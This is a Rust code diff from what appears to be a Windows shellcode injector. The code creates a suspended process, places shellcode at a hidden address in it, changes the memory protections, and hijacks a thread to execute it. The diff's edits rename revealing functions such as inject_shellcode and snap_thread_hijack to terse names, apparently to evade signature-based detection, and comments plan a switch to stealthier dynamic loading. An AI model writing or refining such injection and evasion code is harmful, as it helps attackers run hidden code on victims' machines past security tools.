@@ -12,8 +12,8 @@ use winapi::{
 use std::ffi::c_void as std_c_void;
 
 mod func;
-
-pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
+//formerly inject_shellcode
+pub fn inj_s(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
     //get the teb with noldr
     let teb = get_teb();
 
@@ -22,7 +22,8 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
         None => return Err("Failed to get kernel32.dll address".to_string()),
     };
 
-    let pi = CreateSuspendedProcess(kernel32, process_name);
+    //formerly CreateSuspendedProcess
+    let pi = CreateSProcess(kernel32, process_name);
 
     // Check if process creation failed (zeroed PI struct)
     if pi.hProcess.is_null() || pi.hThread.is_null() {
@@ -35,14 +36,17 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
 
     //YOU ARE HERE. need to pass the teb to get_hidden_injection_address and use noldr to load our functions instead of using the crate
 
-    let shellcode_location = func::get_hidden_injection_address(process_handle, shellcode_size, kernel32 as *mut std_c_void)
+    //formerly get_hidden_injection_address
+    let shellcode_location = func::get_hi_address(process_handle, shellcode_size, kernel32 as *mut std_c_void)
         .map_err(|e| format!("Failed to get injection address: {}", e))?;
 
-    if !func::inject_and_rwx(process_handle, shellcode_location, shellcode) {
+    //formerly inj_and_rwx
+    if !func::inj_and_mod(process_handle, shellcode_location, shellcode, kernel32 as *mut std_c_void) {
         return Err("Failed to inject shellcode".to_string());
     }
 
-    if !func::snap_thread_hijack(
+    //formerly snap_thread_hijack
+    if !func::snap_thread_h(
         pi.dwProcessId,
         pi.hThread,
         pi.dwThreadId,
@@ -59,7 +63,8 @@ pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), Stri
 
 //we are going to switch to dynamic loading with noldr
 
-fn CreateSuspendedProcess(
+//formerly CreateSuspendedProcess
+fn CreateSProcess(
     kernel32: *const std::ffi::c_void,
     process_name: &str,
 ) -> PROCESS_INFORMATION {
